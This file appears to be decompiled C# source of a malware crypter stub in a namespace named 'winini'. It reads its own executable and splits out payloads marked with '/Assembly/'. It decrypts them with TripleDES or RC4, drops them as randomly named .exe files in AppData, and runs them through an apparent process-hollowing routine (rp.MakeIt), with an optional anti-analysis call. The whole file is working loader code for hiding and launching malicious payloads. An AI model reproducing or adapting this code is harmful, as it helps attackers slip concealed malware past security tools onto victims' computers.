using System;
using System.Diagnostics;
using System.IO;
using System.Text;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace winini;

[StandardModule]
internal sealed class Mymod
{
	private static string res;

	private static string thepath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";

	public static int RandomNumber(int min, int max)
	{
		Random random = new Random();
		return random.Next(min, max);
	}

	public static string RandomString(int size, bool lowerCase)
	{
		StringBuilder stringBuilder = new StringBuilder();
		Random random = new Random();
		checked
		{
			int num = size - 1;
			int num2 = 0;
			while (true)
			{
				int num3 = num2;
				int num4 = num;
				if (num3 > num4)
				{
					break;
				}
				char value = Convert.ToChar(Convert.ToInt32(26.0 * random.NextDouble() + 65.0));
				stringBuilder.Append(value);
				num2++;
			}
			if (lowerCase)
			{
				return stringBuilder.ToString().ToLower();
			}
			return stringBuilder.ToString();
		}
	}

	public static string GetRandom()
	{
		StringBuilder stringBuilder = new StringBuilder();
		stringBuilder.Append(RandomString(4, lowerCase: true));
		stringBuilder.Append(RandomNumber(1000, 9999));
		stringBuilder.Append(RandomString(2, lowerCase: false));
		return stringBuilder.ToString();
	}

	public static void Main()
	{
		string text = "/Assembly/";
		FileSystem.FileOpen(1, Application.get_ExecutablePath(), (OpenMode)32, (OpenAccess)1, (OpenShare)3, -1);
		checked
		{
			res = Strings.Space((int)FileSystem.LOF(1));
			FileSystem.FileGet(1, ref res, -1L, false);
			FileSystem.FileClose(new int[1] { 1 });
			string[] array = Strings.Split(res, text, -1, (CompareMethod)0);
			string text2 = GetRandom().ToString() + ".exe";
			string text3 = array[2];
			string text4 = array[3];
			string text5 = array[4];
			string text6 = array[5];
			if (Operators.CompareString(text6, "own", false) == 0)
			{
				text6 = Process.GetCurrentProcess().MainModule!.FileName;
			}
			if (Operators.CompareString(text5, "true", false) == 0)
			{
				ant.mofo();
			}
			if (Operators.CompareString(array[6], "yes", false) == 0)
			{
				if (Operators.CompareString(text4, "tripleDES", false) == 0)
				{
					FileSystem.FileOpen(1, thepath + "a" + text2, (OpenMode)32, (OpenAccess)(-1), (OpenShare)(-1), -1);
					FileSystem.FilePut(1, _3des.a(array[7], text3, d: true), -1L, false);
					FileSystem.FileClose(new int[1] { 1 });
				}
				else if (Operators.CompareString(text4, "rc4", false) == 0)
				{
					FileSystem.FileOpen(1, thepath + "a" + text2, (OpenMode)32, (OpenAccess)(-1), (OpenShare)(-1), -1);
					FileSystem.FilePut(1, _4cr.enc(array[7], text3), -1L, false);
					FileSystem.FileClose(new int[1] { 1 });
				}
				FileInfo fileInfo = new FileInfo(thepath + "a" + text2);
				FileStream fileStream = fileInfo.OpenRead();
				long length = fileStream.Length;
				if (length > 0L)
				{
					byte[] array2 = new byte[(int)(length - 1L) + 1];
					fileStream.Read(array2, 0, (int)length);
					rp.MakeIt(array2, text6);
					fileStream.Close();
				}
			}
			if (Operators.CompareString(text4, "tripleDES", false) == 0)
			{
				FileSystem.FileOpen(1, thepath + text2, (OpenMode)32, (OpenAccess)(-1), (OpenShare)(-1), -1);
				FileSystem.FilePut(1, _3des.a(array[1], text3, d: true), -1L, false);
				FileSystem.FileClose(new int[1] { 1 });
			}
			else if (Operators.CompareString(text4, "rc4", false) == 0)
			{
				FileSystem.FileOpen(1, thepath + text2, (OpenMode)32, (OpenAccess)(-1), (OpenShare)(-1), -1);
				FileSystem.FilePut(1, _4cr.enc(array[1], text3), -1L, false);
				FileSystem.FileClose(new int[1] { 1 });
			}
			FileInfo fileInfo2 = new FileInfo(thepath + text2);
			FileStream fileStream2 = fileInfo2.OpenRead();
			long length2 = fileStream2.Length;
			if (length2 > 0L)
			{
				byte[] array3 = new byte[(int)(length2 - 1L) + 1];
				fileStream2.Read(array3, 0, (int)length2);
				rp.MakeIt(array3, text6);
				fileStream2.Close();
			}
			ProjectData.EndApp();
		}
	}
}
